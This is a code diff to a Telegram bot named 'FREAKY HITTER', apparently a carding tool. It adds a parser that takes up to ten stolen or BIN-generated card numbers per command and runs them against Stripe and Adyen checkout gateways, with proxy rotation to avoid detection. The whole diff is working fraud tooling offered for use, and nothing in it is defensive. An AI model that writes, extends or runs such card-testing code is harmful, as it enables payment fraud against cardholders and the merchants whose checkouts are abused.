@@ -115,10 +115,10 @@ async def cmds_command(message: types.Message) -> None:
     commands_text = (
         "⚡ <b>FREAKY HITTER COMMANDS</b> ⚡\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "💳 <b>/hit</b> <code>[url] [cc\|mm\|yy\|cvc]</code>\n"
-        "└ <i>Hits a single card against Stripe checkout.</i>\n\n"
-        "💎 <b>/hitad</b> <code>[url] [cc\|mm\|yy\|cvc]</code>\n"
-        "└ <i>Hits cards against Adyen gateway checkout.</i>\n\n"
+        "💳 <b>/hit</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
+        "└ <i>Hits 1 to 10 cards against Stripe checkout.</i>\n\n"
+        "💎 <b>/hitad</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
+        "└ <i>Hits 1 to 10 cards against Adyen gateway checkout.</i>\n\n"
         "🎲 <b>/hit</b> <code>[url] [bin_pattern] [count]</code>\n"
         "└ <i>Generates BIN cards and hits concurrently.</i>\n\n"
         "🌐 <b>/proxy</b> <code>[ip:port:user:pass]</code>\n"
@@ -130,13 +130,7 @@ async def cmds_command(message: types.Message) -> None:
         "🔌 <b>/offproxy</b>\n"
         "└ <i>Clears proxy pool & uses direct IP.</i>\n\n"
         "🛑 <b>/stop</b>\n"
-        "└ <i>Instantly aborts your active session.</i>\n\n"
-        "👑 <b>/approve</b> <code>[user_id]</code>\n"
-        "└ <i>(Owner) Authorizes a user permanently.</i>\n\n"
-        "📢 <b>/setlog</b>\n"
-        "└ <i>(Owner) Sets channel for hit log forwards.</i>\n\n"
-        "📋 <b>/allproxies</b>\n"
-        "└ <i>(Owner) Displays raw proxy database.</i>\n"
+        "└ <i>Instantly aborts your active session.</i>\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
     await message.answer(commands_text)
@@ -179,6 +173,63 @@ async def approve_command(message: types.Message):
     except Exception as e:
         print(f"Failed to send peer notification to approved user: {e}")
 
+def parse_cards_input(payload_tokens: list, raw_payload: str):
+    """
+    Parses cards from user payload.
+    Supports:
+    1. BIN generation: /hit [url] [bin_pattern] [count]
+    2. Single or Multiple CCs (up to 10): /hit [url] [cc1] [cc2] ... [cc10] (separated by space or newline)
+    """
+    cards = []
+    count_val = payload_tokens[-1] if payload_tokens else ''
+    
+    # Check for BIN generation: /hit [url] [bin_pattern] [count]
+    if count_val.isdigit() and len(count_val) <= 3 and len(payload_tokens) >= 2:
+        potential_bin = "".join(payload_tokens[:-1]).strip()
+        if 'x' in potential_bin.lower() or len(potential_bin) >= 6:
+            count = int(count_val)
+            if count > 10:
+                return None, "Maximum batch limit is 10 concurrent requests."
+            for _ in range(count):
+                card = CardGenerator.generate(potential_bin)
+                if card:
+                    cards.append(card)
+            if not cards:
+                return None, "BIN pattern generation failed."
+            return cards, None
+
+    # Parse direct cards using regex (matches space, newline, tab separated cards)
+    matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', raw_payload)
+    if matches:
+        for m in matches:
+            cards.append({
+                'card': m[0],
+                'month': m[1].zfill(2),
+                'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
+                'cvv': m[3]
+            })
+    else:
+        # Fallback cleaning for single card with non-standard delimiters
+        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
+        clean_cc = clean_cc.replace('/', '|')
+        cc_parts = [p for p in clean_cc.split('|') if p]
+        if len(cc_parts) == 4:
+            cards.append({
+                'card': cc_parts[0],
+                'month': cc_parts[1].zfill(2),
+                'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
+                'cvv': cc_parts[3]
+            })
+
+    if not cards:
+        return None, "Invalid card formatting. Expected: <code>card|mm|yy|cvv</code> (up to 10 cards separated by space/newline)"
+        
+    if len(cards) > 10:
+        return None, f"Submission of {len(cards)} cards rejected. Max concurrent limit is 10."
+        
+    return cards, None
+
+
 @dp.message(Command("hit"))
 async def hit_command(message: types.Message):
     user_id = message.from_user.id
@@ -194,55 +245,16 @@ async def hit_command(message: types.Message):
 
     raw_tokens = message.text.strip().split()
     if len(raw_tokens) < 3:
-        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hit [url] [bin_pattern] [count]\nOR\n/hit [url] [card|month|year|cvv]</code>")
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hit [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hit [url] [bin_pattern] [count]</code>")
         return
         
     url = raw_tokens[1]
     payload_tokens = raw_tokens[2:]
-    raw_payload = " ".join(payload_tokens)
-    cards = []
+    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else ""
     
-    # Check if the last part is a count (for BIN gen)
-    parts = payload_tokens
-    count_val = parts[-1] if parts else ''
-    
-    if count_val.isdigit() and len(count_val) <= 3:
-        # Format: /hit [url] [bin_pattern] [count]
-        bin_pattern = "".join(parts[:-1]).strip()
-        count = int(count_val)
-        if count > 10:
-            await message.answer("<b>Error</b>\n<code>Maximum batch limit is 10 concurrent requests.</code>")
-            return
-            
-        # Generate Cards
-        for _ in range(count):
-            card = CardGenerator.generate(bin_pattern)
-            if card:
-                cards.append(card)
-                
-        if not cards:
-            await message.answer("<b>Error</b>\n<code>BIN pattern generation failed.</code>")
-            return
-    else:
-        # Format: /hit [url] [cc]
-        # Clean all non-numeric and non-delimiter characters
-        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
-        clean_cc = clean_cc.replace('/', '|')
-        cc_parts = [p for p in clean_cc.split('|') if p]
-        
-        if len(cc_parts) != 4:
-            await message.answer("<b>Error</b>\n<code>Invalid card formatting. Expected: number|mm|yy|cvv</code>")
-            return
-            
-        cards.append({
-            'card': cc_parts[0],
-            'month': cc_parts[1].zfill(2),
-            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
-            'cvv': cc_parts[3]
-        })
-        
-    if len(cards) > 10:
-        await message.answer(f"<b>Error</b>\n<code>Submission of {len(cards)} cards rejected. Max concurrent limit: 10.</code>")
+    cards, err = parse_cards_input(payload_tokens, raw_payload)
+    if err:
+        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
         return
         
     status_msg = None
@@ -670,50 +682,16 @@ async def hitad_command(message: types.Message):
 
     raw_tokens = message.text.strip().split()
     if len(raw_tokens) < 3:
-        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad [url] [bin_pattern] [count]\nOR\n/hitad [url] [card|month|year|cvv]</code>")
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitad [url] [bin_pattern] [count]</code>")
         return
         
     url = raw_tokens[1]
     payload_tokens = raw_tokens[2:]
-    raw_payload = " ".join(payload_tokens)
-    cards = []
+    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else ""
     
-    parts = payload_tokens
-    count_val = parts[-1] if parts else ''
-    
-    if count_val.isdigit() and len(count_val) <= 3:
-        bin_pattern = "".join(parts[:-1]).strip()
-        count = int(count_val)
-        if count > 10:
-            await message.answer("<b>Error</b>\n<code>Maximum batch limit is 10 concurrent requests.</code>")
-            return
-            
-        for _ in range(count):
-            card = CardGenerator.generate(bin_pattern)
-            if card:
-                cards.append(card)
-                
-        if not cards:
-            await message.answer("<b>Error</b>\n<code>BIN pattern generation failed.</code>")
-            return
-    else:
-        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
-        clean_cc = clean_cc.replace('/', '|')
-        cc_parts = [p for p in clean_cc.split('|') if p]
-        
-        if len(cc_parts) != 4:
-            await message.answer("<b>Error</b>\n<code>Invalid card formatting. Expected: number|mm|yy|cvv</code>")
-            return
-            
-        cards.append({
-            'card': cc_parts[0],
-            'month': cc_parts[1].zfill(2),
-            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
-            'cvv': cc_parts[3]
-        })
-        
-    if len(cards) > 10:
-        await message.answer(f"<b>Error</b>\n<code>Submission of {len(cards)} cards rejected. Max concurrent limit: 10.</code>")
+    cards, err = parse_cards_input(payload_tokens, raw_payload)
+    if err:
+        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
         return
 
     status_msg = await message.answer("⏳ <b>Initializing Adyen Engine...</b>")
@@ -1217,8 +1195,10 @@ async def process_show_commands(callback: types.CallbackQuery):
     commands_text = (
         "⚡ <b>FREAKY HITTER COMMANDS</b> ⚡\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "💳 <b>/hit</b> <code>[url] [cc\|mm\|yy\|cvc]</code>\n"
-        "└ <i>Hits a single card against target checkout.</i>\n\n"
+        "💳 <b>/hit</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
+        "└ <i>Hits 1 to 10 cards against Stripe checkout.</i>\n\n"
+        "💎 <b>/hitad</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
+        "└ <i>Hits 1 to 10 cards against Adyen gateway checkout.</i>\n\n"
         "🎲 <b>/hit</b> <code>[url] [bin_pattern] [count]</code>\n"
         "└ <i>Generates BIN cards and hits concurrently.</i>\n\n"
         "🌐 <b>/proxy</b> <code>[ip:port:user:pass]</code>\n"
@@ -1230,16 +1210,9 @@ async def process_show_commands(callback: types.CallbackQuery):
         "🔌 <b>/offproxy</b>\n"
         "└ <i>Clears proxy pool & uses direct IP.</i>\n\n"
         "🛑 <b>/stop</b>\n"
-        "└ <i>Instantly aborts your active session.</i>\n\n"
-        "👑 <b>/approve</b> <code>[user_id]</code>\n"
-        "└ <i>(Owner) Authorizes a user permanently.</i>\n\n"
-        "📢 <b>/setlog</b>\n"
-        "└ <i>(Owner) Sets channel for hit log forwards.</i>\n\n"
-        "📋 <b>/allproxies</b>\n"
-        "└ <i>(Owner) Displays raw proxy database.</i>\n"
+        "└ <i>Instantly aborts your active session.</i>\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
-    await callback.message.answer(commands_text)
     await callback.message.answer(commands_text)
     await callback.answer()
 
